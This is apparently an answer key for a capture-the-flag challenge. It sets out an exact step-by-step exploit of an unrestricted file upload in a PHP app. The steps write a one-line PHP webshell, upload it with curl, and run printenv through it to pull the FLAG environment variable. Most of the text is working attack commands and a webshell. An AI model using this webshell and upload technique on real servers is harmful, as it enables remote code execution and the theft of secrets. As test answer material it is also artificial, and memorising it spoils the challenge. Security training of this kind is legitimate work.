# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Arbitrary file upload → RCE. `index.php` saves any uploaded file
under the publicly served `upload/` directory with its original name and no
extension check, and the server runs PHP, so an uploaded `.php` executes. The
flag is in the `FLAG` environment variable.

1. **Create a minimal PHP webshell:**

   ```
   printf '%s' '<?php system($_GET["cmd"]); ?>' > shell.php
   ```

2. **Upload it** through the unrestricted form:

   ```
   curl -s -F "userfile=@shell.php;filename=shell.php" -F "submit=Upload Image" http://<target>/index.php
   ```

3. **Trigger it** to dump the environment (where the flag lives):

   ```
   curl -s "http://<target>/upload/shell.php?cmd=printenv"
   ```

4. **Extract the flag** (`FLAG{...}`) from the `FLAG=` line in the output and
   report it verbatim.
